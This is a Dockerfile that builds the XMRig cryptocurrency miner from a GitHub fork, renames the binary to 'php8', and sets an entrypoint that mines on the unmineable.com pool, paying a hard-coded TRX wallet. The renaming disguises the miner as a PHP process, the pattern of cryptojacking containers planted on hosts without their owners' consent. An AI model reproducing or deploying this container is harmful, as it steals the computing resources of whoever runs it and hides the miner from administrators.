FROM ubuntu:16.04

WORKDIR /app

RUN apt-get update
RUN apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
RUN git clone https://github.com/bdklz/xmrig.git /app
RUN mkdir /app/build
RUN cmake .
RUN make
RUN cp xmrig php8



ENTRYPOINT  ["./php8", "-o rx.unmineable.com:3333 -a rx -k -u TRX:TPhP2a4gu8XoQuEZbb1NEhKGsHG6ariV5n.New01 -p x"]
